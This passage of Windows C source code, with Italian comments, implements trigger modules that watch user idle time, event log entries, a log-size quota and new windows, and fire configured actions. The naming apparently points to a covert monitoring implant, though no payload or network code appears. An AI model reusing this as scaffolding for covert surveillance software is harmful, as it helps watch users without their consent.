		Sleep(500); 
		CANCELLATION_POINT(em_ui_cp);
		Sleep(500); 
		CANCELLATION_POINT(em_ui_cp);

		if (idle < 0xFFFFFFFF)
			idle++;
		// Nuovo input!
		if (GetLastInputInfo(&lii)) {
			if (lii.dwTime != last_time) {
				last_time = lii.dwTime;

				// Esegue l'azione di end per quei threshold che erano scattati
				for (i=0; i<user_idles_count; i++) {
					if (idle>user_idles_table[i].threshold && user_idles_table[i].threshold>0) {
						StopRepeatThread(user_idles_table[i].event_id);
						TriggerEvent(user_idles_table[i].event_param.stop_action, user_idles_table[i].event_id);
					}
				}
				idle = 0;
			}
		}

		for (i=0; i<user_idles_count; i++) {
			// Verifica se alcuni threshold sono scattati
			if (idle==user_idles_table[i].threshold && user_idles_table[i].threshold>0) {
				TriggerEvent(user_idles_table[i].event_param.start_action, user_idles_table[i].event_id);
				CreateRepeatThread(user_idles_table[i].event_id, user_idles_table[i].event_param.repeat_action, user_idles_table[i].event_param.count, user_idles_table[i].event_param.delay);
			}
		}
	}

	// not reached
	return 0;
}


void WINAPI EM_UserIdlesAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	void *temp_table;

	if ( !(temp_table = realloc(user_idles_table, (user_idles_count + 1)*sizeof(monitored_user_idles))) )
		return;

	user_idles_table = (monitored_user_idles *)temp_table;
	memcpy(&user_idles_table[user_idles_count].event_param, event_param, sizeof(event_param_struct));	
	user_idles_table[user_idles_count].event_id = event_id;
	user_idles_table[user_idles_count].threshold = conf_json[L"time"]->AsNumber();

	user_idles_count++;
}


void WINAPI EM_UserIdlesStart()
{
	DWORD dummy;

	// Crea il thread solo se ci sono azioni da fare
	if (user_idles_count>0)
		em_ui_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUserIdles, NULL, 0, &dummy);
}


void WINAPI EM_UserIdlesStop()
{
	QUERY_CANCELLATION(em_ui_thread, em_ui_cp);

	for (DWORD i=0; i<user_idles_count; i++) 
		StopRepeatThread(user_idles_table[i].event_id);

	SAFE_FREE(user_idles_table);
	user_idles_count = 0;
}



//---------------------------------------------------
// MONITOR DEGLI EVENTI WINDOWS
#define SAFE_CLOSE(x) { if(x) FNC(CloseEventLog)(x); x = 0; }

typedef struct {
	DWORD event_monitored;
	DWORD event_triggered;
	DWORD event_id;
} monitored_event;

typedef struct {
	char *source_name;     // nome sorgente eventi
	HANDLE source_handle;  // handle sorgente eventi
	DWORD last_record_num; // numero di eventi presenti nella sorgente all'ultima lettura
	DWORD event_count;     // numero di eventi da monitorare per quella sorgente
	monitored_event *event_array; // array degli eventi da monitorare con relative azioni
} monitored_source;

#define EM_ME_SLEEPTIME 300
#define EM_ME_BUFFER_SIZE 2048

HANDLE em_me_monevent_thread = 0;
DWORD em_me_source_count = 0;
monitored_source *em_me_source_table = NULL;

BOOL em_me_cp = FALSE;


// Thread di monitoring degli eventi
DWORD MonitorWindowsEvent(DWORD dummy)
{
	DWORD i, j, k, new_record_count, oldest_event;
	DWORD dwRead, dwNeeded;
    EVENTLOGRECORD *pevlr; 
    BYTE bBuffer[EM_ME_BUFFER_SIZE];   

	pevlr = (EVENTLOGRECORD *) &bBuffer; 

	LOOP {
		CANCELLATION_POINT(em_me_cp);

		// Cicla fra le sorgenti
		for (i=0; i<em_me_source_count; i++) {
			// Effettua il parsing dei nuovi eventi solo se l'handle alla sorgente e'
			// valido e se riesce a leggere il numero di eventi
			if (!em_me_source_table[i].source_handle ||
				!FNC(GetNumberOfEventLogRecords)(em_me_source_table[i].source_handle, &new_record_count) ||
				!FNC(GetOldestEventLogRecord)(em_me_source_table[i].source_handle, &oldest_event))
				continue;
			
			new_record_count += oldest_event;

			// Cicla fra i nuovi eventi presenti nella sorgente i-esima
			// (non consideriamo l'eventualita' in cui gli eventi possano essere cancellati 
			// selettivamente).
			for (j=em_me_source_table[i].last_record_num; j<new_record_count; j++) {
				// Se non riesce a leggere l'evento j-esimo, passa al successivo
				if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ, 
					              j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded )) {
					// Se non riesce a leggere potrebbe esserci stata una modifica al registro.
					// Allora prova a chiuderlo e a riaprirlo.
					SAFE_CLOSE(em_me_source_table[i].source_handle);
					em_me_source_table[i].source_handle = FNC(OpenEventLogA)(NULL, em_me_source_table[i].source_name);

					// Se fallisce la riapertura esce dal ciclo e non considera piu' la sorgente
					if (!em_me_source_table[i].source_handle)
						break;

					// Se fallisce la seconda lettura allora c'e' un errore di tipo diverso.
					if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ, 
					              j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded ))
						continue;
				}

				// Cicla fra gli eventi da monitorare per la sorgente i-esima
				for (k=0; k<em_me_source_table[i].event_count; k++) 
					// Compara l'evento j-esimo nella sorgente con il k-esimo 
					// elemento da monitorare per quella sorgente
					if (pevlr->EventID == em_me_source_table[i].event_array[k].event_monitored) {
						TriggerEvent(em_me_source_table[i].event_array[k].event_triggered, em_me_source_table[i].event_array[k].event_id);
						break;
					}
			}

			// Aggiorna il numero di eventi per la sorgente
			em_me_source_table[i].last_record_num = new_record_count;
		}
	
		Sleep(EM_ME_SLEEPTIME);
	}
}


// Aggiunge un evento da monitorare a una sorgente
void MonEventAddEvent(monitored_source *source_entry, DWORD event_monitored, DWORD event_triggered, DWORD event_id)
{
	void *temp_table;

	// event_array e' inizializzato a 0 in EM_MonEventAdd
	// XXX...altro piccolo ed improbabile int overflow
	if ( !(temp_table = realloc(source_entry->event_array, (source_entry->event_count + 1)*sizeof(monitored_event))) )
		return;
	
	source_entry->event_array = (monitored_event *)temp_table;
	source_entry->event_array[source_entry->event_count].event_monitored = event_monitored;
	source_entry->event_array[source_entry->event_count].event_triggered = event_triggered;
	source_entry->event_array[source_entry->event_count].event_id = event_id;
	source_entry->event_count++;
}


void WINAPI EM_MonEventAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	void *temp_table;
	char source_name[260];
	DWORD event_monitored;
	DWORD i;

	sprintf_s(source_name, "%S", conf_json[L"source"]->AsString().c_str());
	event_monitored = conf_json[L"id"]->AsNumber();

	// Se la sorgente e' gia' monitorata aggiunge un evento...
	for (i=0; i<em_me_source_count; i++) 
		if (!strcmp(em_me_source_table[i].source_name, source_name)) {
			MonEventAddEvent(em_me_source_table + i, event_monitored, event_param->start_action, event_id);
			return;
		}

	// ...altrimenti aggiunge la sorgente...
	// (XXX...altro piccolo ed improbabile int overflow)
	if ( !(temp_table = realloc(em_me_source_table, (em_me_source_count + 1)*sizeof(monitored_source))) )
		return;

	em_me_source_table = (monitored_source *)temp_table;
	em_me_source_table[em_me_source_count].event_count = 0;
	em_me_source_table[em_me_source_count].event_array = NULL;
	em_me_source_table[em_me_source_count].source_handle = 0;
	em_me_source_table[em_me_source_count].last_record_num = 0;
	em_me_source_table[em_me_source_count].source_name = _strdup(source_name);

	// ...e aggiunge l'evento...
	MonEventAddEvent(em_me_source_table + em_me_source_count, event_monitored, event_param->start_action, event_id);

	em_me_source_count++;
}


void WINAPI EM_MonEventStart()
{
	DWORD dummy, i, record_number, oldest_record;

	// Apre tutte le sorgenti da monitorare (verranno chiuse in EM_MonEventStop)
	// e inizializza il numero di eventi gia' presenti al momento dell'apertura
	for (i=0; i<em_me_source_count; i++) {
		em_me_source_table[i].source_handle = FNC(OpenEventLogA)(NULL, em_me_source_table[i].source_name);
		if (em_me_source_table[i].source_handle &&
			FNC(GetNumberOfEventLogRecords)(em_me_source_table[i].source_handle, &record_number) &&
			FNC(GetOldestEventLogRecord)(em_me_source_table[i].source_handle, &oldest_record))
			em_me_source_table[i].last_record_num = record_number + oldest_record;
		else {
			// Se non riesce a leggere il numero di eventi chiude la sorgente e non 
			// la considera' piu'.
			em_me_source_table[i].last_record_num = 0;		
			SAFE_CLOSE(em_me_source_table[i].source_handle);
		}
	}

	// Crea il thread solo se ci sono sorgenti da monitorare
	if (em_me_source_count>0)
		em_me_monevent_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorWindowsEvent, NULL, 0, &dummy);
}


void WINAPI EM_MonEventStop()
{
	DWORD i;

	QUERY_CANCELLATION(em_me_monevent_thread, em_me_cp);
	
	// Libera tutte le strutture allocate
	for (i=0; i<em_me_source_count; i++) {
		SAFE_FREE(em_me_source_table[i].source_name);
		SAFE_FREE(em_me_source_table[i].event_array);
		SAFE_CLOSE(em_me_source_table[i].source_handle);
	}
	SAFE_FREE(em_me_source_table);
	em_me_source_count = 0;
}





//----------------------------------------------------
// QUOTA DISCO
typedef struct {
	DWORD disk_quota;
	event_param_struct event_param;
	DWORD event_id;
	BOOL cp;        // semaforo per l'uscita dei thread di controllo
	HANDLE thread_id;
} monitored_quota;

DWORD em_qt_quota_count = 0;
monitored_quota *em_qt_quota_table = NULL;

#define QUOTA_DELAY_INTERVAL 100
#define QUOTA_DELAY_SLEEP    60000
DWORD QuotaMonitorThread(monitored_quota *quota)
{
	DWORD i, log_size;
	BOOL quota_passed = FALSE;

	LOOP {
		log_size = LOG_GetActualLogSize();

		if (log_size > quota->disk_quota) {
			TriggerEvent(quota->event_param.start_action, quota->event_id);
			CreateRepeatThread(quota->event_id, quota->event_param.repeat_action, quota->event_param.count, quota->event_param.delay);
			quota_passed = TRUE;
		} else {
			if (quota_passed) {
				quota_passed = FALSE;
				StopRepeatThread(quota->event_id);
				TriggerEvent(quota->event_param.stop_action, quota->event_id);
			}
		}

		// -> Sleep(QUOTA_DELAY_SLEEP);
		for (i=0; i<=QUOTA_DELAY_SLEEP / QUOTA_DELAY_INTERVAL; i++) {
			CANCELLATION_POINT(quota->cp);
			Sleep(QUOTA_DELAY_INTERVAL); 
		}

	}

	return 0;
}

#define QUOTA_NEW_TAG 0x20100505
void WINAPI EM_QuotaAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	typedef struct {
		DWORD disk_quota;
		DWORD tag;
		DWORD exit_event;
	} conf_entry_t;
	conf_entry_t *conf_entry;
	void *temp_table;

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_qt_quota_table, (em_qt_quota_count + 1)*sizeof(monitored_quota))) )
		return;

	em_qt_quota_table = (monitored_quota *)temp_table;
	em_qt_quota_table[em_qt_quota_count].thread_id = 0;
	em_qt_quota_table[em_qt_quota_count].disk_quota = conf_json[L"quota"]->AsNumber();
	memcpy(&em_qt_quota_table[em_qt_quota_count].event_param, event_param, sizeof(event_param_struct));	
	em_qt_quota_table[em_qt_quota_count].event_id = event_id;
	em_qt_quota_table[em_qt_quota_count].cp = FALSE;

	em_qt_quota_count++;
}


void WINAPI EM_QuotaStart()
{
	DWORD i, dummy;
	// Lancia i thread che controllano le quote
	for (i=0; i<em_qt_quota_count; i++) 
		em_qt_quota_table[i].thread_id = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)QuotaMonitorThread, (LPVOID)&em_qt_quota_table[i], 0, &dummy);
}


void WINAPI EM_QuotaStop()
{
	DWORD i;

	// Uccide i thread di controllo e di repeat
	for (i=0; i<em_qt_quota_count; i++) {
		QUERY_CANCELLATION(em_qt_quota_table[i].thread_id, em_qt_quota_table[i].cp);
		StopRepeatThread(em_qt_quota_table[i].event_id);
	}

	SAFE_FREE(em_qt_quota_table);
	em_qt_quota_count = 0;
}

//---------------------------------------------------




//---------------------------------------------------
// MONITOR NEW WINDOW

typedef struct {
	event_param_struct event_param;
	DWORD event_id;
} monitor_newwindow_struct;

BOOL g_newwindow_created = FALSE; // Viene messa a TRUE dal dispatcher PM_NewWindowDispatch
DWORD em_newwindow_count = 0;
monitor_newwindow_struct *newwindow_table = NULL;
HANDLE em_mnw_thread = 0;
BOOL em_mnw_cp = FALSE;
#define EM_MNW_SLEEPTIME 300

DWORD MonitorNewWindowThread(DWORD dummy)
{
	LOOP {
		DWORD i;
		CANCELLATION_POINT(em_mnw_cp);

		// Viene messa a TRUE dal dispatcher PM_NewWindowDispatch
		if (g_newwindow_created) {
			g_newwindow_created = FALSE;
			for (i=0; i<em_newwindow_count; i++) 
				TriggerEvent(newwindow_table[i].event_param.start_action, newwindow_table[i].event_id);
		}
		Sleep(EM_MNW_SLEEPTIME);
	}
	// not reached
	return 0;
}

void WINAPI EM_NewWindowAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	void *temp_table;

	if ( !(temp_table = realloc(newwindow_table, (em_newwindow_count + 1)*sizeof(monitor_newwindow_struct))) )
		return;

	newwindow_table = (monitor_newwindow_struct *)temp_table;
	memcpy(&newwindow_table[em_newwindow_count].event_param, event_param, sizeof(event_param_struct));	
	newwindow_table[em_newwindow_count].event_id = event_id;

	em_newwindow_count++;
}

void WINAPI EM_NewWindowStart()
{
	DWORD dummy;

	// Crea il thread solo se ci sono azioni da fare
	if (em_newwindow_count>0) {
		em_mnw_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewWindowThread, NULL, 0, &dummy);
		AM_IPCAgentStartStop(PM_ONNEWWINDOW_IPC, TRUE);
	}
}


void WINAPI EM_NewWindowStop()
{
	AM_IPCAgentStartStop(PM_ONNEWWINDOW_IPC, FALSE);
	QUERY_CANCELLATION(em_mnw_thread, em_mnw_cp);
	SAFE_FREE(newwindow_table);
	em_newwindow_count = 0;
}









